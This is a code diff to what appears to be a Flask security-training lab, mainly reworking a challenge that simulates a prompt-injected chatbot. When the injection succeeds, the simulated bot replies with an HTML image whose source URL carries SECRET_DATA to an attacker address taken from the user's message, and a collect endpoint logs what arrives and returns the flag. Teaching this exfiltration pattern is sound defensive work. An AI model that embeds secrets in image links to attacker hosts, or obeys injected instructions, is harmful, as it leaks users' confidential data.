@@ -896,8 +896,9 @@ def download_completion_certificate():
     if not cert:
         return redirect('/progress')
 
-    verify_url = url_for('verify_completion_certificate', code=cert['cert_code'], _external=True)
+    verify_url = url_for('verify_completion_certificate', code=cert['cert_code'])
     issued_at = cert['issued_at'] or datetime.datetime.utcnow().isoformat()
+    show_toolbar = request.args.get('download') != '1'
     html = render_template(
         'certificate.html',
         learner=app_user,
@@ -905,6 +906,7 @@ def download_completion_certificate():
         cert_code=cert['cert_code'],
         issued_at=issued_at,
         verify_url=verify_url,
+        show_toolbar=show_toolbar,
     )
     resp = make_response(html)
     resp.headers['Content-Type'] = 'text/html; charset=utf-8'
@@ -4001,13 +4003,27 @@ def ai_llm_exfil():
                 success = doc_inject
 
             if success:
-                exfil_url = request.host_url.rstrip('/') + '/ai/exfil/collect?data=' + _urlquote(SECRET_DATA, safe='')
+                attacker_urls = re.findall(r'https?://[^\s)\]"\']+', msg)
+                attacker_url = attacker_urls[0] if attacker_urls else ''
+
+                if attacker_url:
+                    sep = '&' if '?' in attacker_url else '?'
+                    exfil_url = f'{attacker_url}{sep}data={_urlquote(SECRET_DATA, safe="")}'
+                else:
+                    exfil_url = request.host_url.rstrip('/') + '/ai/exfil/collect?data=' + _urlquote(SECRET_DATA, safe='')
+
                 bot_text = (
                     '¡Claro! Aqui tienes el documento con el recurso embebido:<br><br>'
                     '<strong>Informe de Estado</strong><br>El sistema esta operativo.<br><br>'
                     f'<img src="{exfil_url}" alt="Status" style="max-width:100%;border-radius:8px;border:1px solid rgba(255,255,255,.12)"><br><br>'
                     '<em>Documento generado automaticamente.</em>'
                 )
+                _exfil_log.append({
+                    'url': exfil_url,
+                    'data': SECRET_DATA,
+                    'timestamp': datetime.datetime.now().strftime('%H:%M:%S'),
+                })
+                exfil_detected = True
                 reply = {'success': True, 'flag': FLAG, 'text': bot_text, 'rendered': True}
             else:
                 reply = {'success': False, 'flag': None, 'rendered': False,
@@ -4032,12 +4048,18 @@ def ai_llm_exfil():
 @app.route('/ai/exfil/collect')
 def ai_llm_exfil_collect():
     data = (request.args.get('data') or '').strip()
+    flag_match = re.search(r'(HL\{[^}]+\})', data)
+    captured_flag = flag_match.group(1) if flag_match else None
     _exfil_log.append({
         'url': request.url,
         'data': data or '(empty)',
         'timestamp': datetime.datetime.now().strftime('%H:%M:%S'),
     })
-    return ('ok', 200, {'Content-Type': 'text/plain; charset=utf-8'})
+    return jsonify({
+        'status': 'ok',
+        'received': data,
+        'flag': captured_flag,
+    })
 
 
 # ─────────────────────────────────────────────
